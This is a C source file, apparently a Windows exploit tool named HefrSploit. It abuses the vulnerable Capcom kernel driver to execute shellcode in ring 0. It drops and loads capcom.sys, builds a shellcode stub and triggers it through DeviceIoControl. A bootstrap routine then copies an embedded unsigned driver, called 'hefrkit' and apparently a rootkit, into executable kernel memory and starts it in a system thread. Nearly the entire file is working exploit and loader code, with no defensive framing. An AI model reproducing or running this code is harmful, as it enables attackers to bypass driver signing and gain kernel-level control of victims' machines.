#include "HefrSploit.h"
#include <stdio.h>
#include "instdrv.h"
#include "resource.h"
#include "nt.h"
#include "shared.h"

NTSTATUS 
Bootstrap_0(
    MmGetSystemRoutineAddress_t MmGetSystemRoutineAddress,
    PUCHAR UserDriver,
    DWORD UserDriverSize,
    ULONG BootstrapOffset);

VOID
CapcomExploit(
    HANDLE hCapcom,
    PVOID driver,
    DWORD driver_size);

static 
UINT 
GetProcAddressOffset(
    PUCHAR moduleBaseAddress, 
    LPCSTR name);

static
BOOL
GetResource(
    int id,
    LPVOID *resource,
    LPDWORD resourceSize);

static
PIMAGE_SECTION_HEADER
GetSectionHeader(
    DWORD rva,
    PIMAGE_NT_HEADERS nt);

static
ULONG
RvaToOffset(
    DWORD rva,
    PIMAGE_NT_HEADERS nt,
    PIMAGE_DOS_HEADER base);

static
PVOID
RvaToPtr(
    DWORD rva,
    PIMAGE_NT_HEADERS nt,
    PIMAGE_DOS_HEADER base);

static
VOID
SetCookie(
    PUCHAR ModuleBase);

static
BOOL
WriteDriverToDisk(
    LPWSTR filename,
    LPBYTE data,
    DWORD size);

#pragma const_seg(push, stack1, ".text")
SHELLCODE sc = {
    { 0xFB },                                   // STI
    { 0x48, 0xBA, },                            // mov rdx, driver_address
    { 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, },
    { 0x41, 0xB8, },                            // mov r8d, driver_size
    { 0x00, 0x00, 0x00, 0x00, },
    { 0x41, 0xB9, },                            // mov r9d, boostrap_offset
    { 0x00, 0x40, 0x00, 0x00 },
    { 0xff, 0x25, 0x00, 0x00, 0x00, 0x00, },    // jmp qword ptr [nextline]
    &Bootstrap_0,};
#pragma const_seg(pop, stack1)

int main()
{
    BOOL success;
    LPVOID hefrkit = NULL, capcom = NULL;
    DWORD hefrSize = 0, capcomSize = 0;
    HANDLE hDevice = INVALID_HANDLE_VALUE;

    success = GetResource(IDR_RCDATA_HEFRKIT, &hefrkit, &hefrSize);
    if (success == FALSE)
    {
        fprintf(stderr, "GetResource Failed\n");
        goto end;
    }

    success = GetResource(IDR_RCDATA_CAPCOM, &capcom, &capcomSize);
    if (success == FALSE)
    {
        fprintf(stderr, "GetResource Failed\n");
        goto end;
    }

    success = WriteDriverToDisk((LPWSTR)CAPCOM_PATH, (LPBYTE)capcom, capcomSize);
    if (success == FALSE)
    {
        fprintf(stderr, "WriteDriverToDisk Failed\n");
        goto end;
    }

    success = scmLoadDeviceDriver(CAPCOM_NAME, CAPCOM_PATH, CAPCOM_DEVICE_NAME, &hDevice);
    if (success == FALSE)
    {
        fprintf(stderr, "scmLoadDeviceDriver Failed\n");
        goto end;
    }

    CapcomExploit(hDevice, hefrkit, hefrSize);

    success = scmUnloadDeviceDriver(CAPCOM_NAME);
    if (success == FALSE)
    {
        fprintf(stderr, "scmUnloadDeviceDriver Failed\n");
        goto end;
    }

end:
    return 0;
}

NTSTATUS Bootstrap_0(
    MmGetSystemRoutineAddress_t MmGetSystemRoutineAddress,
    PUCHAR UserDriver,
    DWORD UserDriverSize,
    ULONG BootstrapOffset)
{
    NTSTATUS status;
    HANDLE hThread;
    OBJECT_ATTRIBUTES oa;
    ExAllocatePoolWithTag_t ExAllocatePoolWithTag = NULL;
    ExFreePoolWithTag_t ExFreePoolWithTag = NULL;
    IoCreateDriver_t IoCreateDriver = NULL;
    RtlImageNtHeader_t RtlImageNtHeader = NULL;
    RtlImageDirectoryEntryToData_t RtlImageDirectoryEntryToData = NULL;
    RtlQueryModuleInformation_t RtlQueryModuleInformation = NULL;
    PsCreateSystemThread_t PsCreateSystemThread = NULL;
    ZwClose_t ZwClose = NULL;
    PUCHAR rawDriver = NULL;
    PSHARED_CONTEXT ctx = NULL;

    InitializeObjectAttributes(&oa, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

    if (NULL == MmGetSystemRoutineAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto end;
    }
    
    // Enusure Routines are available before allocating any memory
    if( NULL == (ExAllocatePoolWithTag = (ExAllocatePoolWithTag_t)MmGetSystemRoutineAddress(&usExAllocatePoolWithTag)))
    {
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }

    if (NULL == (ExFreePoolWithTag = (ExFreePoolWithTag_t)MmGetSystemRoutineAddress(&usExFreePoolWithTag)))
    {
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }

    if (NULL == (IoCreateDriver = (IoCreateDriver_t)MmGetSystemRoutineAddress(&usIoCreateDriver)))
    {
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }

    if (NULL == (RtlImageNtHeader = (RtlImageNtHeader_t)MmGetSystemRoutineAddress(&usRtlImageNtHeader)))
    {
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }

    if (NULL == (RtlImageDirectoryEntryToData = (RtlImageDirectoryEntryToData_t)MmGetSystemRoutineAddress(&usRtlImageDirectoryEntryToData)))
    {
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }

    if (NULL == (RtlQueryModuleInformation = (RtlQueryModuleInformation_t)MmGetSystemRoutineAddress(&usRtlQueryModuleInformation)))
    {
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }

    if (NULL == (PsCreateSystemThread = (PsCreateSystemThread_t)MmGetSystemRoutineAddress(&usPsCreateSystemThread)))
    {
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }

    if (NULL == (ZwClose = (ZwClose_t)MmGetSystemRoutineAddress(&usZwClose)))
    {
        status = STATUS_UNSUCCESSFUL;
        goto end;
    }
    
    // Allocate Memory
    rawDriver = (PUCHAR)ExAllocatePoolWithTag(NonPagedPoolExecute, UserDriverSize, HEFR_TAG);
    if (NULL == rawDriver)
    {
        status =  STATUS_NO_MEMORY;
        goto end;
    }

    ctx = (PSHARED_CONTEXT)ExAllocatePoolWithTag(NonPagedPoolExecute, sizeof(SHARED_CONTEXT), HEFR_TAG);
    if (NULL == ctx)
    {
        status = STATUS_NO_MEMORY;
        goto end;
    }

    ctx->ExFreePoolWithTag = (void*)ExFreePoolWithTag;
    ctx->ExAllocatePoolWithTag = (void*)ExAllocatePoolWithTag;
    ctx->IoCreateDriver = (void*)IoCreateDriver;
    ctx->RawDriver = rawDriver;
    ctx->RawDriverSize = UserDriverSize;
    ctx->RtlImageDirectoryEntryToData = RtlImageDirectoryEntryToData;
    ctx->RtlImageNtHeader = RtlImageNtHeader;
    ctx->RtlQueryModuleInformation = RtlQueryModuleInformation;

    __movsq((__int64*)rawDriver, (__int64*)UserDriver, UserDriverSize / sizeof(__int64));
    status = PsCreateSystemThread(&hThread, GENERIC_ALL, &oa, NULL, NULL,  rawDriver + BootstrapOffset, ctx);
    if (NT_SUCCESS(status))
    {
        ZwClose(hThread);	
    }

end:
    if (!NT_SUCCESS(status))
    {
        if (NULL != ExAllocatePoolWithTag)
        {
            if (NULL != rawDriver)
            {
                ExFreePoolWithTag(rawDriver, HEFR_TAG);
            }

            if (NULL != ctx)
            {
                ExFreePoolWithTag(ctx, HEFR_TAG);
            }
        }
    }

    return status;
}

VOID
CapcomExploit(
    HANDLE hCapcom, 
    PVOID driver, 
    DWORD driver_size)
{
    BOOL success = FALSE;
    PCAPCOM_EXPOIT_IO exploit = NULL;
    PVOID InputBuffer = NULL;
    DWORD OutBuffer = 0;
    DWORD BytesReturned = 0;
    UINT offset = 0;
    PUCHAR NTOSKernelBase = NULL;

    offset = GetProcAddressOffset(driver, "DriverBootstrap");
    if (0 == offset)
    {
        return;
    }

    memcpy(sc.BootstrapOffset, &offset, sizeof(UINT));
    memcpy(sc.driver_addr, &driver, sizeof(LPVOID));
    memcpy(sc.driver_size, &driver_size, sizeof(DWORD));

    // Allocate memory for the input to the IoControl.
    if ((exploit = (PCAPCOM_EXPOIT_IO)VirtualAlloc(
        NULL,
        sizeof(CAPCOM_EXPOIT_IO),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    )) == NULL)
    {
        printf("VirtualAlloc Failed: %d\n", GetLastError());
        goto end;
    }

    exploit->sc_addr = &exploit->sc;
    memcpy(&exploit->sc, &sc, sizeof(sc));
    InputBuffer = &exploit->sc;

    printf("Bootstrap_0:           0x%p\n", Bootstrap_0);
    printf("Driver Loader Address: 0x%p\n", driver);
    printf("Driver Size:           0x%X\n", driver_size);
    printf("Bootstrap offset:      0x%X\n", offset);

    SetCookie(driver);

    // Invoke the IoControl, which will call the Shellcode.
    if (0 == DeviceIoControl(
        hCapcom,
        CAPCOM_IO_CONTROL_CODE,
        &InputBuffer,
        sizeof(LPVOID),
        &OutBuffer,
        sizeof(DWORD),
        &BytesReturned,
        NULL))
    {
        printf("DeviceIoControl Failed: %d\n", GetLastError());
        goto end;
    }

    success = TRUE;

end:
    if (hCapcom != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hCapcom);
    }
    if (FALSE == success && NULL != InputBuffer)
    {
        VirtualFree(InputBuffer, 0, MEM_RELEASE);
    }

}

PIMAGE_SECTION_HEADER 
GetSectionHeader(
    DWORD rva, 
    PIMAGE_NT_HEADERS nt)
{
    PIMAGE_SECTION_HEADER sh = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, sh++)
    {
        if ((rva >= sh->VirtualAddress) && (rva < sh->VirtualAddress + sh->Misc.VirtualSize))
        {
            return sh;
        }
    }
    return NULL;
}

UINT
GetProcAddressOffset(
    PUCHAR moduleBaseAddress,
    LPCSTR name)
{
    //Cast DllBase to use struct
    PIMAGE_DOS_HEADER dos = NULL;
    PIMAGE_NT_HEADERS nt = NULL;
    PIMAGE_EXPORT_DIRECTORY exportDir = NULL;
    PIMAGE_SECTION_HEADER sectionHeader = NULL;
    PUINT namesOffset = NULL;
    LPCSTR names;
    SIZE_T nameLen = strlen(name);
    PVOID procAddr = NULL;

    dos = (PIMAGE_DOS_HEADER)moduleBaseAddress;
    nt = (PIMAGE_NT_HEADERS)(moduleBaseAddress + dos->e_lfanew);
    exportDir = RvaToPtr(nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, nt, dos);
    namesOffset = RvaToPtr(exportDir->AddressOfNames, nt, dos);
    names = RvaToPtr(*namesOffset, nt, dos);

    for (unsigned int i = 0; i < exportDir->NumberOfNames; i++)
    {
        //Calculate Absolute Address and cast
        if (0 == _strnicmp(&names[i], name, nameLen))
        {
            USHORT ordinal = ((PUSHORT)RvaToPtr(exportDir->AddressOfNameOrdinals, nt, dos))[i];
            UINT offset = ((PUINT)RvaToPtr(exportDir->AddressOfFunctions, nt, dos))[ordinal];
            return RvaToOffset(offset, nt, dos);
            //procAddr = (PVOID)(moduleBaseAddress + addr);
        }
    }
    return 0;
}

BOOL
GetResource(
    int id, 
    LPVOID *resource, 
    LPDWORD resourceSize)
{
    BOOL success = FALSE;
    HRSRC hResource;
    HGLOBAL hGlobal;

    hResource = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
    if (hResource == NULL)
    {
        fprintf(stderr, "FindResource Failed: %d\n", GetLastError());
        goto end;
    }
    hGlobal = LoadResource(NULL, hResource);
    if (hGlobal == NULL)
    {
        fprintf(stderr, "LoadResource Failed: %d\n", GetLastError());
        goto end;
    }

    *resourceSize = SizeofResource(NULL, hResource);
    if (*resourceSize == 0)
    {
        fprintf(stderr, "SizeofResource Failed: %d\n", GetLastError());
        goto end;
    }

    *resource = LockResource(hGlobal);
    if (*resource == NULL)
    {
        fprintf(stderr, "LockResource Failed: %d\n", GetLastError());
        goto end;
    }

    DWORD old;
    VirtualProtect(*resource, *resourceSize, PAGE_READWRITE, &old);

    success = TRUE;


end:
    return success;
}

ULONG
RvaToOffset(
    DWORD rva, 
    PIMAGE_NT_HEADERS nt, 
    PIMAGE_DOS_HEADER base)
{
    PIMAGE_SECTION_HEADER sh = GetSectionHeader(rva, nt);

    if (sh == NULL) return 0;
    return (ULONG)(sh->PointerToRawData + rva - sh->VirtualAddress);
}

PVOID 
RvaToPtr(
    DWORD rva, 
    PIMAGE_NT_HEADERS nt, 
    PIMAGE_DOS_HEADER base)
{
    PIMAGE_SECTION_HEADER sh = GetSectionHeader(rva, nt);

    if (sh == NULL) return NULL;
    return (PVOID)((PBYTE)base + sh->PointerToRawData + rva - sh->VirtualAddress);
}

VOID
SetCookie(
    PUCHAR ModuleBase)
{
    PIMAGE_DOS_HEADER               DosHeader;
    PIMAGE_NT_HEADERS64             NtHeader;
    PIMAGE_OPTIONAL_HEADER64        OptionalHeader;
    PIMAGE_DATA_DIRECTORY           DataDirectory;
    PIMAGE_LOAD_CONFIG_DIRECTORY64  LoadConfig;
    LARGE_INTEGER                   SecurityCookie;

    DosHeader = (PIMAGE_DOS_HEADER)ModuleBase;
    NtHeader = (PIMAGE_NT_HEADERS64)(ModuleBase + DosHeader->e_lfanew);
    OptionalHeader = (PIMAGE_OPTIONAL_HEADER64)&NtHeader->OptionalHeader;
    DataDirectory = (PIMAGE_DATA_DIRECTORY)(OptionalHeader->DataDirectory);
    LoadConfig = RvaToPtr(DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress, NtHeader, DosHeader);

    QueryPerformanceCounter(&SecurityCookie);
    *((PULONGLONG)RvaToPtr((USHORT)LoadConfig->SecurityCookie, NtHeader, DosHeader)) = SecurityCookie.QuadPart;
}

BOOL
WriteDriverToDisk(
    LPWSTR filename,
    LPBYTE data,
    DWORD size)
{
    BOOL success = FALSE;
    WCHAR driver[MAX_PATH * sizeof(WCHAR)];
    DWORD charsUsed = 0;
    HANDLE hDriver = INVALID_HANDLE_VALUE;
    DWORD err;
    DWORD nWritten;

    hDriver = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_NORMAL, NULL);
    err = GetLastError();
    if (hDriver == INVALID_HANDLE_VALUE)
    {
        if (err == ERROR_FILE_EXISTS)
        {
            // make a poor assumption that the correct capcom driver is already loaded
            success = TRUE;
            goto end;
        }
        fwprintf(stderr, L"CreateFile failed (%d) to create_new: %s\n", err, driver);
        goto end;
    }

    if (!WriteFile(hDriver, data, size, &nWritten, NULL))
    {
        fprintf(stderr, "WriteFile Failed: %d\n", GetLastError());
        goto end;
    }

    success = TRUE;
end:
    if (hDriver != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hDriver);
    }

    return success;
}